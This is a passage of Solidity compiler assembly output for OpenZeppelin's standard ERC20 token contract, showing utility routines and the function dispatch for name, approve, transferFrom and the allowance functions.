\"#utility.yul\":769:770   */\n  0x00\n    /* \"#utility.yul\":760:770   */\n  swap2\n  pop\n    /* \"#utility.yul\":779:912   */\ntag_25:\n    /* \"#utility.yul\":793:795   */\n  dup4\n    /* \"#utility.yul\":790:791   */\n  dup3\n    /* \"#utility.yul\":787:796   */\n  lt\n    /* \"#utility.yul\":779:912   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":881:895   */\n  dup6\n  dup3\n  add\n    /* \"#utility.yul\":877:900   */\n  dup4\n  add\n    /* \"#utility.yul\":871:901   */\n  mload\n    /* \"#utility.yul\":850:864   */\n  dup2\n  dup4\n  add\n    /* \"#utility.yul\":846:869   */\n  dup5\n  add\n    /* \"#utility.yul\":839:902   */\n  mstore\n    /* \"#utility.yul\":804:814   */\n  swap1\n  dup3\n  add\n  swap1\n    /* \"#utility.yul\":779:912   */\n  jump(tag_25)\ntag_27:\n    /* \"#utility.yul\":954:955   */\n  0x00\n    /* \"#utility.yul\":932:947   */\n  swap4\n  dup2\n  add\n    /* \"#utility.yul\":928:952   */\n  swap1\n  swap3\n  add\n    /* \"#utility.yul\":921:956   */\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"#utility.yul\":936:942   */\n  swap5\n    /* \"#utility.yul\":146:986   */\n  swap4\n  pop\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":991:1553   */\ntag_3:\n    /* \"#utility.yul\":1090:1096   */\n  0x00\n    /* \"#utility.yul\":1098:1104   */\n  dup1\n    /* \"#utility.yul\":1151:1153   */\n  0x40\n    /* \"#utility.yul\":1139:1148   */\n  dup4\n    /* \"#utility.yul\":1130:1137   */\n  dup6\n    /* \"#utility.yul\":1126:1149   */\n  sub\n    /* \"#utility.yul\":1122:1154   */\n  slt\n    /* \"#utility.yul\":1119:1171   */\n  iszero\n  tag_29\n  jumpi\n    /* \"#utility.yul\":1167:1168   */\n  0x00\n    /* \"#utility.yul\":1164:1165   */\n  dup1\n    /* \"#utility.yul\":1157:1169   */\n  revert\n    /* \"#utility.yul\":1119:1171   */\ntag_29:\n    /* \"#utility.yul\":1194:1210   */\n  dup3\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":1259:1273   */\n  dup1\n  dup3\n  gt\n    /* \"#utility.yul\":1256:1290   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1286:1287   */\n  0x00\n    /* \"#utility.yul\":1283:1284   */\n  dup1\n    /* \"#utility.yul\":1276:1288   */\n  revert\n    /* \"#utility.yul\":1256:1290   */\ntag_30:\n    /* \"#utility.yul\":1309:1370   */\n  tag_31\n    /* \"#utility.yul\":1362:1369   */\n  dup7\n    /* \"#utility.yul\":1353:1359   */\n  dup4\n    /* \"#utility.yul\":1342:1351   */\n  dup8\n    /* \"#utility.yul\":1338:1360   */\n  add\n    /* \"#utility.yul\":1309:1370   */\n  tag_11\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1299:1370   */\n  swap4\n  pop\n    /* \"#utility.yul\":1416:1418   */\n  0x20\n    /* \"#utility.yul\":1405:1414   */\n  dup6\n    /* \"#utility.yul\":1401:1419   */\n  add\n    /* \"#utility.yul\":1395:1420   */\n  mload\n    /* \"#utility.yul\":1379:1420   */\n  swap2\n  pop\n    /* \"#utility.yul\":1445:1447   */\n  dup1\n    /* \"#utility.yul\":1435:1443   */\n  dup3\n    /* \"#utility.yul\":1432:1448   */\n  gt\n    /* \"#utility.yul\":1429:1465   */\n  iszero\n  tag_32\n  jumpi\n    /* \"#utility.yul\":1461:1462   */\n  0x00\n    /* \"#utility.yul\":1458:1459   */\n  dup1\n    /* \"#utility.yul\":1451:1463   */\n  revert\n    /* \"#utility.yul\":1429:1465   */\ntag_32:\n  pop\n    /* \"#utility.yul\":1484:1547   */\n  tag_33\n    /* \"#utility.yul\":1539:1546   */\n  dup6\n    /* \"#utility.yul\":1528:1536   */\n  dup3\n    /* \"#utility.yul\":1517:1526   */\n  dup7\n    /* \"#utility.yul\":1513:1537   */\n  add\n    /* \"#utility.yul\":1484:1547   */\n  tag_11\n  jump\t// in\ntag_33:\n    /* \"#utility.yul\":1474:1547   */\n  swap2\n  pop\n  pop\n    /* \"#utility.yul\":991:1553   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1558:1938   */\ntag_12:\n    /* \"#utility.yul\":1637:1638   */\n  0x01\n    /* \"#utility.yul\":1633:1645   */\n  dup2\n  dup2\n  shr\n  swap1\n    /* \"#utility.yul\":1680:1692   */\n  dup3\n  and\n  dup1\n    /* \"#utility.yul\":1701:1762   */\n  tag_35\n  jumpi\n    /* \"#utility.yul\":1755:1759   */\n  0x7f\n    /* \"#utility.yul\":1747:1753   */\n  dup3\n    /* \"#utility.yul\":1743:1760   */\n  and\n    /* \"#utility.yul\":1733:1760   */\n  swap2\n  pop\n    /* \"#utility.yul\":1701:1762   */\ntag_35:\n    /* \"#utility.yul\":1808:1810   */\n  0x20\n    /* \"#utility.yul\":1800:1806   */\n  dup3\n    /* \"#utility.yul\":1797:1811   */\n  lt\n    /* \"#utility.yul\":1777:1795   */\n  dup2\n    /* \"#utility.yul\":1774:1812   */\n  sub\n    /* \"#utility.yul\":1771:1932   */\n  tag_36\n  jumpi\n    /* \"#utility.yul\":1854:1864   */\n  0x4e487b71\n    /* \"#utility.yul\":1849:1852   */\n  0xe0\n    /* \"#utility.yul\":1845:1865   */\n  shl\n    /* \"#utility.yul\":1842:1843   */\n  0x00\n    /* \"#utility.yul\":1835:1866   */\n  mstore\n    /* \"#utility.yul\":1889:1893   */\n  0x22\n    /* \"#utility.yul\":1886:1887   */\n  0x04\n    /* \"#utility.yul\":1879:1894   */\n  mstore\n    /* \"#utility.yul\":1917:1921   */\n  0x24\n    /* \"#utility.yul\":1914:1915   */\n  0x00\n    /* \"#utility.yul\":1907:1922   */\n  revert\n    /* \"#utility.yul\":1771:1932   */\ntag_36:\n  pop\n    /* \"#utility.yul\":1558:1938   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2069:2614   */\ntag_14:\n    /* \"#utility.yul\":2171:2173   */\n  0x1f\n    /* \"#utility.yul\":2166:2169   */\n  dup3\n    /* \"#utility.yul\":2163:2174   */\n  gt\n    /* \"#utility.yul\":2160:2608   */\n  iszero\n  tag_39\n  jumpi\n    /* \"#utility.yul\":2207:2208   */\n  0x00\n    /* \"#utility.yul\":2232:2237   */\n  dup2\n    /* \"#utility.yul\":2228:2230   */\n  dup2\n    /* \"#utility.yul\":2221:2238   */\n  mstore\n    /* \"#utility.yul\":2277:2281   */\n  0x20\n    /* \"#utility.yul\":2273:2275   */\n  dup2\n    /* \"#utility.yul\":2263:2282   */\n  keccak256\n    /* \"#utility.yul\":2347:2349   */\n  0x1f\n    /* \"#utility.yul\":2335:2345   */\n  dup6\n    /* \"#utility.yul\":2331:2350   */\n  add\n    /* \"#utility.yul\":2328:2329   */\n  0x05\n    /* \"#utility.yul\":2324:2351   */\n  shr\n    /* \"#utility.yul\":2318:2322   */\n  dup2\n    /* \"#utility.yul\":2314:2352   */\n  add\n    /* \"#utility.yul\":2383:2387   */\n  0x20\n    /* \"#utility.yul\":2371:2381   */\n  dup7\n    /* \"#utility.yul\":2368:2388   */\n  lt\n    /* \"#utility.yul\":2365:2412   */\n  iszero\n  tag_40\n  jumpi\n  pop\n    /* \"#utility.yul\":2406:2410   */\n  dup1\n    /* \"#utility.yul\":2365:2412   */\ntag_40:\n    /* \"#utility.yul\":2461:2463   */\n  0x1f\n    /* \"#utility.yul\":2456:2459   */\n  dup6\n    /* \"#utility.yul\":2452:2464   */\n  add\n    /* \"#utility.yul\":2449:2450   */\n  0x05\n    /* \"#utility.yul\":2445:2465   */\n  shr\n    /* \"#utility.yul\":2439:2443   */\n  dup3\n    /* \"#utility.yul\":2435:2466   */\n  add\n    /* \"#utility.yul\":2425:2466   */\n  swap2\n  pop\n    /* \"#utility.yul\":2516:2598   */\ntag_41:\n    /* \"#utility.yul\":2534:2536   */\n  dup2\n    /* \"#utility.yul\":2527:2532   */\n  dup2\n    /* \"#utility.yul\":2524:2537   */\n  lt\n    /* \"#utility.yul\":2516:2598   */\n  iszero\n  tag_43\n  jumpi\n    /* \"#utility.yul\":2579:2596   */\n  dup3\n  dup2\n  sstore\n    /* \"#utility.yul\":2560:2561   */\n  0x01\n    /* \"#utility.yul\":2549:2562   */\n  add\n    /* \"#utility.yul\":2516:2598   */\n  jump(tag_41)\ntag_43:\n    /* \"#utility.yul\":2520:2523   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":2160:2608   */\ntag_39:\n    /* \"#utility.yul\":2069:2614   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2790:4142   */\ntag_7:\n    /* \"#utility.yul\":2910:2920   */\n  dup2\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":2932:2962   */\n  dup2\n  gt\n    /* \"#utility.yul\":2929:2985   */\n  iszero\n  tag_47\n  jumpi\n    /* \"#utility.yul\":2965:2983   */\n  tag_47\n  tag_10\n  jump\t// in\ntag_47:\n    /* \"#utility.yul\":2994:3091   */\n  tag_48\n    /* \"#utility.yul\":3084:3090   */\n  dup2\n    /* \"#utility.yul\":3044:3082   */\n  tag_49\n    /* \"#utility.yul\":3076:3080   */\n  dup5\n    /* \"#utility.yul\":3070:3081   */\n  sload\n    /* \"#utility.yul\":3044:3082   */\n  tag_12\n  jump\t// in\ntag_49:\n    /* \"#utility.yul\":3038:3042   */\n  dup5\n    /* \"#utility.yul\":2994:3091   */\n  tag_14\n  jump\t// in\ntag_48:\n    /* \"#utility.yul\":3146:3150   */\n  0x20\n  dup1\n    /* \"#utility.yul\":3210:3212   */\n  0x1f\n    /* \"#utility.yul\":3199:3213   */\n  dup4\n  gt\n    /* \"#utility.yul\":3227:3228   */\n  0x01\n    /* \"#utility.yul\":3222:3885   */\n  dup2\n  eq\n  tag_51\n  jumpi\n    /* \"#utility.yul\":3929:3930   */\n  0x00\n    /* \"#utility.yul\":3946:3952   */\n  dup5\n    /* \"#utility.yul\":3943:4032   */\n  iszero\n  tag_52\n  jumpi\n  pop\n    /* \"#utility.yul\":3998:4017   */\n  dup6\n  dup4\n  add\n    /* \"#utility.yul\":3992:4018   */\n  mload\n    /* \"#utility.yul\":3943:4032   */\ntag_52:\n  not(0x00)\n    /* \"#utility.yul\":2747:2748   */\n  0x03\n    /* \"#utility.yul\":2743:2754   */\n  dup7\n  swap1\n  shl\n    /* \"#utility.yul\":2739:2763   */\n  shr\n    /* \"#utility.yul\":2735:2764   */\n  not\n    /* \"#utility.yul\":2725:2765   */\n  and\n    /* \"#utility.yul\":2771:2772   */\n  0x01\n    /* \"#utility.yul\":2767:2778   */\n  dup6\n  swap1\n  shl\n    /* \"#utility.yul\":2722:2779   */\n  or\n    /* \"#utility.yul\":4045:4126   */\n  dup6\n  sstore\n    /* \"#utility.yul\":3192:4136   */\n  jump(tag_43)\n    /* \"#utility.yul\":3222:3885   */\ntag_51:\n    /* \"#utility.yul\":2016:2017   */\n  0x00\n    /* \"#utility.yul\":2009:2023   */\n  dup6\n  dup2\n  mstore\n    /* \"#utility.yul\":2053:2057   */\n  0x20\n    /* \"#utility.yul\":2040:2058   */\n  dup2\n  keccak256\n  not(0x1f)\n    /* \"#utility.yul\":3258:3278   */\n  dup7\n  and\n  swap2\n    /* \"#utility.yul\":3376:3612   */\ntag_55:\n    /* \"#utility.yul\":3390:3397   */\n  dup3\n    /* \"#utility.yul\":3387:3388   */\n  dup2\n    /* \"#utility.yul\":3384:3398   */\n  lt\n    /* \"#utility.yul\":3376:3612   */\n  iszero\n  tag_57\n  jumpi\n    /* \"#utility.yul\":3479:3498   */\n  dup9\n  dup7\n  add\n    /* \"#utility.yul\":3473:3499   */\n  mload\n    /* \"#utility.yul\":3458:3500   */\n  dup3\n  sstore\n    /* \"#utility.yul\":3571:3598   */\n  swap5\n  dup5\n  add\n  swap5\n    /* \"#utility.yul\":3539:3540   */\n  0x01\n    /* \"#utility.yul\":3527:3541   */\n  swap1\n  swap2\n  add\n  swap1\n    /* \"#utility.yul\":3406:3425   */\n  dup5\n  add\n    /* \"#utility.yul\":3376:3612   */\n  jump(tag_55)\ntag_57:\n    /* \"#utility.yul\":3380:3383   */\n  pop\n    /* \"#utility.yul\":3640:3646   */\n  dup6\n    /* \"#utility.yul\":3631:3638   */\n  dup3\n    /* \"#utility.yul\":3628:3647   */\n  lt\n    /* \"#utility.yul\":3625:3826   */\n  iszero\n  tag_58\n  jumpi\n    /* \"#utility.yul\":3701:3720   */\n  dup8\n  dup6\n  add\n    /* \"#utility.yul\":3695:3721   */\n  mload\n  not(0x00)\n    /* \"#utility.yul\":3784:3785   */\n  0x03\n    /* \"#utility.yul\":3780:3794   */\n  dup9\n  swap1\n  shl\n    /* \"#utility.yul\":3796:3799   */\n  0xf8\n    /* \"#utility.yul\":3776:3800   */\n  and\n    /* \"#utility.yul\":3772:3809   */\n  shr\n    /* \"#utility.yul\":3768:3810   */\n  not\n    /* \"#utility.yul\":3753:3811   */\n  and\n    /* \"#utility.yul\":3738:3812   */\n  dup2\n  sstore\n    /* \"#utility.yul\":3625:3826   */\ntag_58:\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":3872:3873   */\n  0x01\n    /* \"#utility.yul\":3856:3870   */\n  swap1\n  dup2\n  shl\n    /* \"#utility.yul\":3852:3874   */\n  add\n    /* \"#utility.yul\":3839:3875   */\n  swap1\n  sstore\n  pop\n    /* \"#utility.yul\":2790:4142   */\n  jump\t// out\ntag_16:\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1532:12844  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1532:12844  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x39509351\n      gt\n      tag_14\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_10\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_11\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_12\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2158:2256  function name() public view virtual override returns (string memory) {... */\n    tag_3:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4444:4641  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_4:\n      tag_19\n      tag_20\n      calldatasize\n      0x04\n      tag_21\n      jump\t// in\n    tag_20:\n      tag_22\n      jump\t// in\n    tag_19:\n      mload(0x40)\n        /* \"#utility.yul\":1169:1183   */\n      swap1\n      iszero\n        /* \"#utility.yul\":1162:1184   */\n      iszero\n        /* \"#utility.yul\":1144:1185   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1132:1134   */\n      0x20\n        /* \"#utility.yul\":1117:1135   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4444:4641  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n      tag_17\n        /* \"#utility.yul\":1004:1191   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3255:3361  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_5:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3342:3354  _totalSupply */\n      sload(0x02)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3255:3361  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_25:\n      mload(0x40)\n        /* \"#utility.yul\":1342:1367   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3255:3361  function totalSupply() public view virtual override returns (uint256) {... */\n      tag_17\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5203:5459  function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_6:\n      tag_19\n      tag_30\n      calldatasize\n      0x04\n      tag_31\n      jump\t// in\n    tag_30:\n      tag_32\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3104:3195  function decimals() public view virtual override returns (uint8) {... */\n    tag_7:\n      mload(0x40)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3186:3188  18 */\n      0x12\n        /* \"#utility.yul\":1853:1889   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1841:1843   */\n      0x20\n        /* \"#utility.yul\":1826:1844   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3104:3195  function decimals() public view virtual override returns (uint8) {... */\n      tag_17\n        /* \"#utility.yul\":1711:1895   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5854:6088  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_8:\n      tag_19\n      tag_39\n      calldatasize\n      0x04\n      tag_21\n      jump\t// in\n    tag_39:\n      tag_40\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3419:3544  function balanceOf(address account) public view virtual override returns (uint256) {... */\n    tag_9:\n      tag_25\n      tag_43\n      calldatasize\n      0x04\n      tag_44\n      jump\t// in\n    tag_43:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3519:3537  _balances[account] */\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3493:3500  uint256 */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3519:3537  _balances[account] */\n      swap1\n      dup2\n      mstore\n      0x20\n      dup2\n      swap1\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3419:3544  function balanceOf(address account) public view virtual override returns (uint256) {... */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2369:2471  function symbol() public view virtual override returns (string memory) {... */\n    tag_10:\n      tag_15\n      tag_48\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6575:7002  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_11:\n      tag_19\n      tag_51\n      calldatasize\n      0x04\n      tag_21\n      jump\t// in\n    tag_51:\n      tag_52\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3740:3929  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_12:\n      tag_19\n      tag_55\n      calldatasize\n      0x04\n      tag_21\n      jump\t// in\n    tag_55:\n      tag_56\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3987:4136  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_13:\n      tag_25\n      tag_59\n      calldatasize\n      0x04\n      tag_60\n      jump\t// in\n    tag_59:\n      tag_61\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2158:2256  function name() public view virtual override returns (string memory) {... */\n    tag_16:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2212:2225  string memory */\n      0x60\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2244:2249  _name */\n      0x03\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2237:2249  return _name */\n      dup1\n      sload\n      tag_64\n      swap1\n      tag_65\n      jump\t// in\n    tag_64:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_66\n      swap1\n      tag_65\n      jump\t// in\n    tag_66:\n      dup1\n      iszero\n      tag_67\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_68\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_67)\n    tag_68:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_69:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_69\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_67:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2158:2256  function name() public view virtual override returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4444:4641  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_22:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4527:4531  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4581:4613  _approve(owner, spender, amount) */\n      tag_73\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4597:4604  spender */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4606:4612  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4581:4589  _approve */\n      tag_74\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4581:4613  _approve(owner, spender, amount) */\n      jump\t// in\n    tag_73:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4630:4634  true */\n      0x01\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4623:4634  return true */\n      swap2\n      pop\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4444:4641  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_70:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5203:5459  function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_32:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5300:5304  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5356:5394  _spendAllowance(from, spender, amount) */\n      tag_78\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5372:5376  from */\n      dup6\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5387:5393  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5356:5371  _spendAllowance */\n      tag_79\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5356:5394  _spendAllowance(from, spender, amount) */\n      jump\t// in\n    tag_78:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5404:5431  _transfer(from, to, amount) */\n      tag_80\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5414:5418  from */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5420:5422  to */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5424:5430  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5404:5413  _transfer */\n      tag_81\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5404:5431  _transfer(from, to, amount) */\n      jump\t// in\n    tag_80:\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5448:5452  true */\n      0x01\n      swap5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5203:5459  function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {... */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5854:6088  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_40:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5942:5946  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5996:6060  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      tag_73\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6012:6019  spender */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6049:6059  addedValue */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6021:6046  allowance(owner, spender) */\n      tag_86\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6012:6019  spender */\n      dup4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6021:6030  allowance */\n      tag_61\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6021:6046  allowance(owner, spender) */\n      jump\t// in\n    tag_86:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6021:6059  allowance(owner, spender) + addedValue */\n      tag_87\n      swap2\n      swap1\n      tag_88\n      jump\t// in\n    tag_87:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5996:6004  _approve */\n      tag_74\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5996:6060  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2369:2471  function symbol() public view virtual override returns (string memory) {... */\n    tag_48:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2425:2438  string memory */\n      0x60\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2457:2464  _symbol */\n      0x04\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2450:2464  return _symbol */\n      dup1\n      sload\n      tag_64\n      swap1\n      tag_65\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6575:7002  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_52:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6668:6672  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6668:6672  bool */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6749:6774  allowance(owner, spender) */\n      tag_98\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6766:6773  spender */\n      dup7\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6749:6758  allowance */\n      tag_61\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6749:6774  allowance(owner, spender) */\n      jump\t// in\n    tag_98:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6722:6774  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6812:6827  subtractedValue */\n      dup4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6792:6808  currentAllowance */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6792:6827  currentAllowance >= subtractedValue */\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6784:6869  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      